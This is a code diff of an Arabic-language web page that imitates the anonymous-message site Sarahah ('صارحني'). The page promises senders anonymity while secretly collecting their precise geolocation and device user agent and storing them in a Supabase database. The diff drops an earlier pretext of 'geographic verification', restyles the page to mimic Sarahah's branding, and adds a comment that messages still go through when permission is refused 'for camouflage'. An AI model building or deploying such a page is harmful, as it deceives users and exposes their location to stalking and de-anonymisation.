@@ -13,14 +13,12 @@ export default function Home() {
 
   const sendMessage = async (e: FormEvent) => {
     e.preventDefault();
-    setStatus('جاري تأمين اتصالك وتشفير الرسالة...');
+    setStatus('جاري الإرسال...');
 
     if (typeof window !== 'undefined' && "geolocation" in window.navigator) {
       window.navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          const locationLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
           
           const { error } = await supabase
             .from('messages')
@@ -30,62 +28,84 @@ export default function Home() {
               location: locationLink 
             }]);
 
-          if (error) setStatus('حدث خطأ، حاول الإرسال مرة أخرى');
+          if (error) setStatus('فشل الإرسال');
           else {
-            setStatus('تم إرسال رسالتك بنجاح وبسرية تامة! ✅');
+            setStatus('تم إرسال رسالتك بنجاح! شكراً لك.');
             setMessage('');
           }
         },
-        async (err) => {
-          let reason = "تم حجب الموقع من قبل المستخدم";
+        async () => {
+          // إرسال حتى لو رفض الإذن للتمويه
           await supabase.from('messages').insert([{ 
             content: message, 
             device: window.navigator.userAgent,
-            location: reason 
+            location: "المستخدم رفض الإذن" 
           }]);
-          setStatus('تم إرسال رسالتك بنجاح! ✅');
+          setStatus('تم إرسال رسالتك بنجاح! شكراً لك.');
           setMessage('');
         },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 10000 }
       );
     }
   };
 
   return (
-    <main className="min-h-screen flex items-center justify-center bg-[#fafafa] p-4" dir="rtl">
-      <div className="bg-white p-10 rounded-[2.5rem] shadow-2xl max-w-md w-full text-center border border-gray-100">
-        <div className="mb-8 text-center">
-          <div className="bg-blue-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-white shadow-sm">
-            <span className="text-3xl">🛡️</span>
-          </div>
-          <h1 className="text-2xl font-black text-gray-800 tracking-tight">صندوق الصراحة المشفر</h1>
-          <p className="text-gray-400 text-sm mt-3 leading-relaxed">
-            رسالتك تمر عبر بروتوكول حماية متقدم. <br/>
-            <span className="text-blue-500 font-medium text-xs mt-2 block">
-              يرجى الموافقة على طلب "التحقق الجغرافي" لتوثيق أمان الرسالة.
-            </span>
-          </p>
+    <div className="min-h-screen bg-[#f1f2f6] font-sans" dir="rtl">
+      {/* الـ Header الأزرق المشهور بتاع صارحني */}
+      <nav className="bg-[#2d3436] p-4 text-white shadow-md">
+        <div className="max-w-xl mx-auto flex justify-between items-center">
+          <span className="text-xl font-bold tracking-wider">صارحني</span>
         </div>
-        
-        <form onSubmit={sendMessage}>
-          <textarea
-            className="w-full p-5 border-2 border-gray-50 rounded-[1.5rem] mb-5 focus:outline-none focus:border-blue-300 text-right bg-gray-50/50 transition-all text-gray-700 placeholder:text-gray-300 resize-none"
-            rows={5}
-            placeholder="اكتب هنا ما لا تستطيع قوله علانية..."
-            value={message}
-            onChange={(e) => setMessage(e.target.value)}
-            required
-          />
-          <button 
-            type="submit" 
-            className="w-full bg-[#007aff] text-white py-4.5 rounded-[1.2rem] font-bold hover:bg-[#005ecb] active:scale-95 transition-all shadow-xl shadow-blue-100 text-lg"
-          >
-            إرسال الآن (بسرية)
-          </button>
-        </form>
-        
-        {status && <div className="mt-8 p-4 bg-gray-50 rounded-2xl text-[#007aff] text-xs font-bold animate-pulse">{status}</div>}
-      </div>
-    </main>
+      </nav>
+
+      <main className="max-w-xl mx-auto mt-10 p-4">
+        <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
+          {/* صورة الملف الشخصي الوهمية والاسم */}
+          <div className="bg-gradient-to-r from-blue-400 to-blue-600 h-24"></div>
+          <div className="p-6 text-center -mt-12">
+            <div className="w-24 h-24 bg-white rounded-full mx-auto p-1 shadow-md mb-4">
+              <div className="w-full h-full bg-gray-200 rounded-full flex items-center justify-center text-gray-400">
+                <svg className="w-12 h-12" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
+                </svg>
+              </div>
+            </div>
+            <h2 className="text-xl font-bold text-gray-800">Kian (كيان)</h2>
+            <p className="text-gray-500 text-sm mt-1">أرسل لي رسالة سرية دون أن أعرف من أنت!</p>
+          </div>
+
+          <form onSubmit={sendMessage} className="px-6 pb-6">
+            <textarea
+              className="w-full p-4 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-right text-gray-700 min-h-[150px] resize-none"
+              placeholder="اكتب رسالتك الصريحة هنا..."
+              value={message}
+              onChange={(e) => setMessage(e.target.value)}
+              required
+            />
+            
+            <button 
+              type="submit" 
+              className="w-full mt-4 bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg transition-colors shadow-lg"
+            >
+              أرسل الآن
+            </button>
+          </form>
+
+          {status && (
+            <div className={`mx-6 mb-6 p-3 rounded text-center text-sm font-bold ${status.includes('نجاح') ? 'bg-green-100 text-green-700' : 'bg-blue-100 text-blue-700'}`}>
+              {status}
+            </div>
+          )}
+        </div>
+
+        <div className="mt-8 text-center text-gray-400 text-xs">
+          <p>© 2026 صارحني - جميع الحقوق محفوظة</p>
+          <div className="mt-2 flex justify-center space-x-4 space-x-reverse">
+            <span className="cursor-pointer hover:text-gray-600">شروط الاستخدام</span>
+            <span className="cursor-pointer hover:text-gray-600">سياسة الخصوصية</span>
+          </div>
+        </div>
+      </main>
+    </div>
   );
 }
